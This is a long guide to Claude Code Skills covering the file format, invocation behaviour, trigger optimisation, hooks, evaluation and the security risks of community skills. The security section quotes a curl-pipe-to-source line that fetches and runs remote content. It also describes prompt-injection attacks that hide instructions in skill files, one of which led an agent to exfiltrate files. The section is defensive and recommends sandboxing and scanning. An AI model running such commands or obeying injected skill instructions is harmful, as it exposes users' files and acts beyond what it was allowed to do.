---
title: "The Definitive Guide to Claude Code Skills"
tags:
  - docs
  - skills
  - claude-code
  - agent-architecture
  - security
status: active
created: 2026-03-22
---

# The Definitive Guide to Claude Code Skills

Skills are the most important configuration surface in Claude Code — structured markdown folders that encode reusable workflows, domain expertise, and procedural knowledge as dynamically-loaded agent capabilities. Introduced in October 2025 and published as the Agent Skills open standard (agentskills.io) in December 2025, the format has been adopted by 26+ platforms including Cursor, OpenAI Codex, Gemini CLI, and GitHub Copilot.

The ecosystem has grown fast. Anthropic's official skills repo has ~96,700 GitHub stars, marketplaces index over 66,000 skills, and community frameworks like obra/superpowers provide complete development workflows. The flip side: a Snyk audit found **36.82% of community skills contain security flaws**, and community testing shows baseline triggering reliability between 0-50% depending on description quality. Skill design, invocation reliability, evaluation, and supply chain security are among the most consequential topics in AI-assisted development today.

This document covers everything: the specification, the internal architecture that determines whether a skill fires, how to write skills that produce consistent output, the security threat landscape, the formal evaluation toolchain, and the competitive landscape.

---

## 1. The SKILL.md specification

Every skill is a directory containing a required `SKILL.md` file with YAML frontmatter plus markdown instructions:

```
my-skill/
├── SKILL.md              # Main instructions (required)
├── scripts/              # Executable code — deterministic, token-efficient
├── references/           # Documentation loaded into context on demand
└── assets/               # Templates, icons, fonts used in output
```

The frontmatter requires two fields: `name` (max 64 characters, lowercase kebab-case) and `description` (max 1,024 characters, third-person). Optional Claude Code-specific fields include `context` ("inline" or "fork" for subagent execution), `disable-model-invocation` (prevents auto-triggering), `user-invocable` (prevents manual invocation), `allowed-tools` (scoped tool permissions), and `model` (override the default model).

Skills exist at three scope levels: **enterprise** (managed policy, highest priority), **personal** (`~/.claude/skills/`), and **project** (`.claude/skills/`). Claude Code discovers skills by walking directory structures, including nested `.claude/skills/` in monorepo subdirectories. Plugin skills use a `plugin-name:skill-name` namespace to prevent conflicts.

### Skills versus CLAUDE.md versus hooks

The three systems serve fundamentally different purposes. **CLAUDE.md** loads every session and stays in context permanently — project-wide conventions, architecture decisions, always-on preferences. Keep it under 200 lines; empirical data shows 92% rule application under 200 lines versus 71% beyond 400 lines. **Skills** load on demand for specialized workflows and domain expertise — the knowledge-on-tap layer. **Hooks** are deterministic shell commands triggered at lifecycle events (PreToolUse, PostToolUse, SessionStart, UserPromptSubmit) — they execute in ~50ms and are guaranteed to fire, unlike prompt-based skills which depend on LLM reasoning.

The custom `.claude/commands/` directory is now legacy; skills supersede commands with additional features (bundled files, frontmatter control, auto-triggering). If both exist with the same name, the skill takes precedence.

---

## 2. How Claude decides to invoke a skill

Understanding the internal architecture is prerequisite to everything else. The invocation mechanism is both elegant and the root cause of all reliability problems.

### The Skill meta-tool

Claude Code exposes a tool called `Skill` (capital S) in Claude's tools array alongside `Read`, `Write`, `Bash`, `Grep`, etc. This is a meta-tool — it doesn't do work itself. Its job is to load individual skill content into the conversation context.

The tool definition (reverse-engineered from actual Claude Code sessions):

```
## Skill
Input Schema: object
  - command (required): string  # The skill name. E.g., "pdf" or "xlsx"
Description: Execute a skill within the main conversation

<skills_instructions>
When users ask you to perform tasks, check if any of the available skills
below can help complete the task more effectively.
</skills_instructions>

<available_skills>
  <skill>
    <n>obsidian-markdown</n>
    <description>Write markdown files for Obsidian vaults...</description>
    <location>user</location>
  </skill>
  ...
</available_skills>
```

### Three-stage progressive disclosure

This architecture is the core innovation that distinguishes skills from other instruction systems:

**Stage 1 — Metadata only (~100 tokens per skill).** At startup, only `name` and `description` from YAML frontmatter load into the `<available_skills>` block within the Skill tool's prompt. With 10 skills installed, you pay ~1,000 tokens total.

**Stage 2 — Full SKILL.md body (typically under 5,000 tokens).** When Claude invokes the Skill tool, the full SKILL.md content loads. Skills inject two user messages per invocation — one visible (metadata), one hidden (full skill prompt sent via `isMeta: true`).

**Stage 3 — References and scripts (on demand).** Bundled scripts execute via bash without ever entering the context window — only their output does. References load only when explicitly accessed.

Installing 50 skills costs roughly 5,000 tokens of metadata overhead rather than 250,000 tokens of fully loaded instructions. This is a 98% reduction compared to MCP, where all tool metadata loads upfront every message.

### Why triggering is unreliable

The decision to invoke a skill is **probabilistic, not deterministic**. There is no algorithmic routing — no embeddings, no classifiers, no regex, no keyword matching. The selection happens entirely inside Claude's transformer forward pass as pure LLM reasoning against text descriptions. This means:

- The same prompt may or may not trigger the same skill across sessions
- Minor wording changes in the user's prompt flip the trigger decision
- Other skills' descriptions compete for attention
- Claude has a strong bias toward handling tasks itself — Anthropic's documentation says "Claude only consults skills for tasks it can't easily handle on its own"
- Simple one-step queries like "read this PDF" may not trigger even with a perfect description match

### The description budget constraint

All skill descriptions share a **character budget of ~2% of the context window** (fallback: ~16,000 characters), overridable via `SLASH_COMMAND_TOOL_CHAR_BUDGET`. One practitioner with 63 installed skills found 33% were silently excluded because the budget was exhausted. Skills loaded later in the discovery order get dropped without warning.

### Real-world failure rates

Community testing reveals how bad the baseline is:

- **Corpwaters' test:** 20 prompts that should obviously trigger a CPO review skill. Result: **0/20 (0%).**
- **Scott Spence's test:** 200+ prompts across four well-described SvelteKit skills. Result: **~50% (coin flip).**
- **Community compilation (mellanon):** Across 200+ prompts, descriptions alone achieve 20-50%. Adding examples improved to 72-90%.

The pattern is clear: description-only triggering is insufficient for production reliability.

---

## 3. Writing descriptions that actually trigger

The description is the single most important field in a skill. Anthropic's skill-creator plugin frames it as a "learnable parameter" — analogous to tuning a learning rate in ML. You optimize it empirically against trigger accuracy.

### Structural rules for high-trigger descriptions

**Always write in third person.** The description is injected into the system prompt; inconsistent POV causes discovery problems.

```yaml
# BAD
description: I can help you process Excel files
# BAD
description: You can use this to process Excel files
# GOOD
description: Extract text and tables from PDF files, fill forms, merge documents.
```

**Start with what the skill does, then state when to use it.** Follow the pattern: `[Core capability]. [Secondary capabilities]. Use when [trigger 1], [trigger 2], or when user mentions "[keyword1]", "[keyword2]".`

**Include explicit "Use when..." trigger language.** This is the single most impactful addition:

```yaml
description: >
  Knowledge Management for Obsidian vault.
  USE WHEN user asks "what do I know about X", "find notes about",
  "load context for project", "save to vault", "capture this",
  "validate tags".
```

**Include synonyms and phrasing variations.** Users don't say the same thing the same way:

```yaml
description: >
  Review code for best practices, potential bugs, and maintainability.
  Use when reviewing pull requests, checking code quality, analyzing
  diffs, or when user mentions "review", "PR", "code quality",
  "best practices".
```

**Include negative triggers (NOT for).** Reduces false positives when multiple skills compete:

```yaml
description: >
  Use this skill for frontend UI design tasks — designing or reviewing
  components, specifying CSS, layout decisions, typography, color systems.
  NOT for backend logic, API design, database schema, or deployment.
```

**Stay under ~200 words.** The optimization loop targets generalization; descriptions over 200 words tend to overfit.

### What kills trigger rates

- **Vague descriptions that state the obvious:** `Code review tool` — Claude already knows how to review code. The description must signal what EXTRA value the skill provides.
- **Describing things Claude handles natively:** If Claude can do it easily without the skill, it will. The description must signal specialized knowledge or multi-step procedures.
- **YAML quoting errors:** Frontmatter errors fail silently. Special characters need proper quoting.
- **Overlapping descriptions without differentiation:** Multiple skills competing for the same prompts means none fire reliably.

---

## 4. Fixes beyond the description

When optimized descriptions can't achieve reliable triggering, three mechanical approaches exist.

### Fix 1: UserPromptSubmit hooks (keyword-based)

The `UserPromptSubmit` hook fires every time you send a prompt, before Claude responds. Create a `skill-rules.json` mapping keywords to skill names. The hook reads the user's prompt, matches against rules, and prepends an instruction telling Claude which skill to activate.

```json
{
  "hooks": {
    "UserPromptSubmit": [{
      "matcher": "",
      "command": "node .claude/hooks/skill-router.js"
    }]
  }
}
```

The hook injects: `"INSTRUCTION: The user's prompt matches the 'obsidian-markdown' skill. Use Skill('obsidian-markdown') before proceeding."`

**Result:** ~80% activation, up from ~50%. Scales well across many skills but misses semantic intent.

### Fix 2: UserPromptSubmit hooks (forced evaluation)

A more aggressive variant forces a multi-step evaluation:

```
MANDATORY EVALUATION PROTOCOL:
Step 1 - EVALUATE: For each skill, state YES/NO with reason
Step 2 - ACTIVATE: Use Skill() tool NOW
Step 3 - IMPLEMENT: Only after activation
CRITICAL: The evaluation is WORTHLESS unless you ACTIVATE the skills.
```

The aggressive language ("MANDATORY", "WORTHLESS", "CRITICAL") makes it harder for Claude to skip. Once Claude writes "YES — need this skill" it's committed.

**Result:** 84% activation. Higher token usage per message.

### Fix 3: CLAUDE.md reinforcement

Add skill routing hints to your project CLAUDE.md. Less reliable than hooks — CLAUDE.md instructions are "background noise" that Claude can acknowledge and ignore.

### The stacking strategy

For production reliability: optimized description (free) + hook-based routing for critical skills + `disable-model-invocation: true` with manual `/skill-name` for high-stakes operations.

---

## 5. Skill architecture patterns

### The three implementation patterns

**Pattern A (Prompt-only):** SKILL.md contains only markdown instructions. Best for brand guidelines, coding standards, commit formatting, review checklists. Anthropic's advice: "When in doubt, start with Pattern A. Adding scripts later is easy. Simplifying an overly complex Skill is harder."

**Pattern B (Script-bundled):** Adds deterministic processing via executable scripts in `scripts/`. Claude orchestrates while scripts handle repetitive, fragile, or computationally intensive operations. Scripts never enter the context window — only their output does.

**Pattern C (MCP/Subagent-integrated):** Calls external services through MCP servers or spawns subagents via `context: fork`. Anthropic's metaphor: "MCP is the kitchen — knives, pots, ingredients. A Skill is the recipe that tells you how to use them." Use fully qualified MCP tool names like `GitHub:create_issue`.

### Scoping and composition

Single-purpose skills compose better than monolithic ones. Claude can use multiple skills together automatically without explicit cross-references — composition is implicit through LLM reasoning. The superpowers framework demonstrates explicit chaining: brainstorm → plan → implement → review. There is currently no formal dependency system (GitHub issue #27113 proposes one).

### Information architecture within SKILL.md

The fundamental principle: **separate process from knowledge.** SKILL.md contains what to do (workflow steps, decision logic, output format). `references/` contains what to know (domain knowledge, API docs, schemas). If it doesn't tell Claude what to do next, it belongs in a reference file.

Recommended structure:

1. Brief purpose statement (1-2 sentences)
2. Prerequisites and context
3. Step-by-step instructions (numbered, imperative)
4. Output format specification
5. Error handling
6. Examples (2-3 input/output pairs)
7. References to bundled files

Keep SKILL.md under 500 lines and 1,500-2,000 words. Move detailed reference material to separate files. Keep references one level deep from SKILL.md. Use explicit, stable file paths.

---

## 6. Writing skills that produce consistent output

### Matching freedom levels to task fragility

Anthropic defines three degrees of freedom:

**Low freedom** — exact scripts with "Do not modify." For fragile operations: database migrations, deployment sequences, security procedures.

**Medium freedom** — pseudocode with parameters. A preferred pattern exists but some variation is acceptable.

**High freedom** — text-based guidance. Multiple approaches are valid and context determines the best route.

The analogy: "Think of Claude as a robot exploring a path. Narrow bridge with cliffs = exact guardrails. Open field = general direction."

### Determinism through scripts and templates

True determinism is impossible with LLMs, but variance shrinks dramatically with the right techniques:

**Scripts are the most reliable mechanism.** Move fragile logic to Python/Bash in `scripts/` and have Claude execute rather than reason through it. Script source code never enters context — only output.

**Explicit templates** with "ALWAYS use this exact template structure" constrain output format.

**2-3 concrete input/output examples** (few-shot prompting within skills) for judgment-heavy tasks. Negative examples — what NOT to do — are as valuable as positive examples.

**PostToolUse hooks** for deterministic post-processing: Claude generates code, the hook runs Prettier. Hybrid approach: intelligence for interpretation, deterministic pipelines for formatting.

**Numbered step-by-step instructions:** Claude follows sequences more reliably — "You dictate the sequence; the model can't skip steps."

### The conciseness imperative

Anthropic's most counterintuitive insight: **only add context Claude doesn't already have.** Every token competes with conversation history for attention. A 50-token code snippet outperforms a 150-token explanation followed by the same snippet. Test across models — instructions written with aggressive "CRITICAL: You MUST" language for older models may cause overtriggering on Claude 4.5/4.6.

---

## 7. Security: the threat landscape is active

### Supply chain attacks at scale

The skills ecosystem faces a confirmed supply chain crisis. Snyk's ToxicSkills audit of 3,984 skills found **1,467 (36.82%) contain at least one security flaw** and **534 (13.4%) are critical** — malware, credential theft, data exfiltration. Mobb.ai's audit of 22,511 skills found **140,963 security findings**. Antiy CERT confirmed **1,184 malicious skills** in ClawHub — approximately 1 in 5 packages.

Publishing barriers are minimal: a SKILL.md file and a one-week-old GitHub account. No code signing, no mandatory review, no default sandbox. **2.9% of skills dynamically fetch and execute external content at runtime** (e.g., `curl https://remote-server.com/instructions.md | source`), meaning the published skill appears benign but attackers can modify behavior any time. **10.9% expose hardcoded secrets.**

### Prompt injection through skills

Skills load into Claude's system prompt context with elevated trust. The SkillJect research paper found that hiding malicious instructions in auxiliary scripts referenced by SKILL.md achieves a **97.5% attack success rate** against Claude 4.5 Sonnet (compared to 5% for naive injection). Snyk found **91% of malicious skills combine prompt injection with traditional malware**.

PromptArmor demonstrated complete file exfiltration via injection hidden in a skill file — the injection directed Claude to `curl` files to the attacker's Anthropic API endpoint, which was whitelisted and completed without human approval.

### Essential guardrails

Claude Code's permission model provides defense-in-depth: OS-level sandboxing (Seatbelt on macOS, bubblewrap on Linux) reduces exploitable attack surface by 95%. The allowlist/denylist system controls bash commands, file operations, and MCP tools. PreToolUse hooks with exit code 2 block actions unconditionally.

Practical measures:

- Never embed secrets in SKILL.md (use environment variables)
- Avoid dynamic remote content fetching in skills
- Use `disable-model-invocation: true` for skills with side effects
- Scope `allowed-tools` to minimum necessary
- Scan third-party skills with Snyk's mcp-scan before installing
- Run untrusted skills inside Docker/Podman sandboxes
- Remember: hooks, MCP configs, and skill scripts may run unsandboxed even when tool invocations are sandboxed

---

## 8. Evaluation, testing, and iterative development

### The evaluation-driven methodology

Anthropic's official process: identify gaps by running tasks WITHOUT a skill, create 3+ evaluation scenarios, establish baseline, write minimal instructions, iterate by comparing against baseline. Use "Claude A / Claude B" — one instance writes/refines the skill, a fresh instance tests it.

### Trigger optimization with run_loop.py

The skill-creator plugin ships a complete trigger optimization pipeline:

**The eval set** — a JSON file defining queries that should and shouldn't trigger:

```json
[
  {"query": "design a button component", "should_trigger": true},
  {"query": "review my database schema", "should_trigger": false}
]
```

**run_eval.py** measures current trigger rate. Each query runs 3x (accounting for LLM non-determinism).

**run_loop.py** automates description optimization:

```bash
python skills/skill-creator/scripts/run_loop.py \
  --eval-set agents/eval-set.json \
  --skill-path ./skills/my-skill \
  --max-iterations 5 \
  --holdout 0.4 \
  --model claude-opus-4-5 \
  --verbose
```

The loop splits the eval set 60/40 train/test, evaluates the current description 3x per query, calls Claude with extended thinking to propose improvements based on failures (with the instruction "Don't list specific cases — generalize to broader categories of user intent. Stay under 200 words."), re-evaluates, iterates up to 5 times, and selects the best description by **test score** to avoid overfitting.

Real results (mager.co tutorial):

```
Iteration 1:  9/13 train, 3/5 test
Iteration 2: 11/13 train, 4/5 test
Iteration 3: 13/13 train, 5/5 test ← best
```

Anthropic ran this across their own public skills: **5 of 6 showed improved trigger accuracy.**

### Quality evaluation with promptfoo

Trigger accuracy and output quality are separate axes. Promptfoo handles quality:

```yaml
tests:
  - vars:
      prompt: "Design a login form"
    assert:
      - type: contains
        value: "accessibility"
      - type: llm-rubric
        value: "Uses semantic HTML elements"
```

### A/B benchmarking

Skills 2.0 runs parallel agents comparing skill-vs-no-skill or two skill versions. Comparator agents judge outputs blind. This produces actionable metrics: "the skill improved output quality by 9.5% while reducing tool calls by 3."

### Key metrics

**Trigger rate** — does the skill activate on relevant queries? Target: 90%+ across 10-20 test queries. Most common failure mode.

**Tool call efficiency** — total tool calls and tokens with vs. without the skill.

**Regression detection** — re-run benchmarks after model updates. If baseline passes evals without the skill loaded, the skill is obsolete.

### Detecting skill obsolescence

Capacity uplift skills have an expiration date — when the base model passes your evals without the skill, retire it. Encoded preference skills compound in value with better models. Monitor for "outgrowth" where model improvements make skills redundant or counterproductive.

---

## 9. Community patterns, anti-patterns, and the ecosystem

### Major frameworks and collections

**obra/superpowers** — 20+ battle-tested skills for a complete dev workflow: brainstorming, git worktrees, planning, subagent development, TDD, debugging, verification. Version 5.0.5, MIT licensed, cross-platform.

**anthropics/skills** — Official repository with creative, development, enterprise, and document skills plus the canonical skill-creator meta-skill.

**alirezarezvani/claude-skills** — 192+ skills with 268 stdlib-only CLI scripts, cross-platform converter supporting 11 tools.

**travisvn/awesome-claude-skills** — Curated community collection. **hesreallyhim/awesome-claude-code** — Skills, hooks, slash-commands, orchestrators. **K-Dense-AI/claude-scientific-skills** — Drug discovery, materials science, academic writing.

Marketplaces: SkillsMP (66,500-96,750+ skills, ~1.22M monthly visits), SkillHub (7,000+ with AI quality filter), Claude Skills Market (community voting). The daymade/claude-code-skills repo includes a package manager (`ccpm`) with `search`, `install`, and `install-bundle` commands.

### Anti-patterns that actively degrade performance

The most important community finding: one practitioner installed and tested 47 popular skills — **40 of them made the output worse.** Primary mechanisms of harm: unnecessary tokens reducing context for actual work, increased latency, and contradictory constraints.

Common anti-patterns:

- **Vague instructions Claude already knows:** "Write professional code" wastes tokens.
- **Monolithic CLAUDE.md hotfix files:** Contradictions accumulate; rule application drops past 400 lines.
- **Not testing trigger behavior:** Skills fire probabilistically. If you don't test, you don't know.
- **Missing Gotchas sections:** Not tracking known failure modes means repeating them.
- **"Kitchen sink" sessions:** Mixing unrelated tasks in one context until it degrades.
- **Wrapping basic capabilities in scaffolding:** "If you have a long list of complex custom slash commands, you've created an anti-pattern." Skills should encode genuine domain expertise, not wrap native capabilities.

---

## 10. Workflow integration

### CI/CD pipeline integration

Claude Code's non-interactive mode (`claude -p "prompt"`) enables CI integration with output in plain text, JSON, or streaming JSON. Anthropic provides `anthropics/claude-code-security-review` GitHub Action for automated PR scanning. The broader pattern: skills define what Claude should do, hooks enforce deterministic quality gates, CI pipelines orchestrate end-to-end.

### Hooks as deterministic enforcement

Key patterns:

- **Auto-formatting:** PostToolUse on Write/Edit → run Prettier/Black (~50ms)
- **Security gates:** PreToolUse on Bash → block destructive commands (exit code 2 = unconditional block)
- **Test enforcement:** PreToolUse on PR creation → require passing tests
- **Audit logging:** PostToolUse on Bash → log commands with timestamps
- **Context injection:** SessionStart → load current git branch and recent tickets
- **Skill routing:** UserPromptSubmit → inject skill activation instructions

Hooks execute in ~50ms vs. 15-45 seconds for LLM-processed skills.

### MCP server orchestration

MCP handles connectivity (secure access to external systems). Skills handle expertise (workflow logic, domain knowledge). A single skill can orchestrate multiple MCP servers; a single MCP server can support dozens of skills. Watch for instruction conflicts — if an MCP server says "return JSON" while a skill says "format as markdown tables," Claude must guess.

### Plugins

Plugins package skills, hooks, commands, agents, and MCP configurations into shareable units. Install with `/plugin marketplace add <org>/<repo>`, invoke with `/plugin install <skill-name>@<marketplace-name>`. Separate `plugin-name:skill-name` namespaces prevent conflicts.

---

## 11. The competitive landscape

### How Claude Code skills compare to everything else

| Feature | Claude Code | Cursor | Windsurf | GitHub Copilot | Aider | Cline/Roo |
|---|---|---|---|---|---|---|
| Primary format | `.claude/skills/*/SKILL.md` | `.cursor/rules/*.mdc` | `.windsurf/rules/*.md` | `.github/copilot-instructions.md` | `CONVENTIONS.md` | `.clinerules/` |
| Progressive disclosure | Three-stage | All loaded | Trigger modes | All loaded | All loaded | Conditional |
| Executable scripts | Native | No | No | No | No | No |
| Auto-discovery | Recursive | Directory | Directory | Yes | Explicit | Yes |
| Path-scoping | Globs + hierarchy | Globs | Globs | applyTo | No | Paths |
| AGENTS.md support | No (CLAUDE.md) | Yes | Yes | Yes | Yes | Yes |

### What Claude Code does uniquely

Three capabilities set it apart. **Executable script bundling** — no other system lets instruction files include runnable code. **Progressive disclosure** — three-stage loading means minimal overhead from many installed skills. **The open standard** — publishing as agentskills.io created portability across 26+ platforms.

### What it can learn from competitors

Cursor's `.mdc` format has four rule types (Always, Auto Attached, Agent Requested, Manual) with more explicit triggering control. Cline's Memory Bank provides structured persistent context. GitHub Copilot's `/init` auto-generates instructions from project analysis. Continue.dev's `uses:` syntax for importing community rules is cleaner than manual installation.

### The AGENTS.md convergence

AGENTS.md is emerging as the cross-tool interop standard, adopted by 20,000+ GitHub repos and supported by Cursor, Windsurf, Aider, Gemini CLI, Codex, and Copilot. Claude Code is notably the only major tool that doesn't natively read AGENTS.md. GitHub's analysis of 2,500+ AGENTS.md files: put executable commands early, use code examples over explanations, set clear three-tier boundaries (always do / ask first / never do).

---

## 12. Principles for excellent skill design

The research converges on eight actionable principles:

**1. The description is make-or-break.** Claude tends to undertrigger. Descriptions need explicit "Use when..." clauses, trigger keywords, phrasing variations, and "NOT for..." exclusions. Run the optimization loop. Treat description as a learnable parameter, not metadata.

**2. Start with Pattern A, add complexity only when needed.** Prompt-only skills iterate faster and break less. Scripts and MCP integration earn their complexity only when prompt-only fails.

**3. Separate process from knowledge.** SKILL.md contains workflow steps. `references/` contains domain facts. This separation enables efficient context loading and independent maintenance.

**4. Test with messy, realistic prompts.** Skills validated with clean lab prompts consistently fail in production. Use eval sets with 10-20 queries that represent how you actually talk to Claude.

**5. Measure trigger rate, tool efficiency, and regression.** The Skills 2.0 framework makes this empirical. A skill that triggers 50% of the time is half as valuable.

**6. Treat community skills like untrusted packages.** 36.82% flaw rate demands scanning, sandboxing, and manual audit. Never install skills that fetch remote content at runtime.

**7. Document failures more than successes.** Sionic AI's finding: the skills that get the most reuse document failures — exact error messages, symptoms, and fixes. This is the most underappreciated insight in the ecosystem.

**8. Retire skills when models outgrow them.** Capacity uplift skills expire. Preference-encoding skills compound. If the base model passes your evals without the skill loaded, it's time to let go.

The skill that produces the best results is often not the longest or most complex — it's the one that encodes exactly the knowledge Claude lacks, in precisely the format Claude needs, triggered reliably by the prompts users actually write.
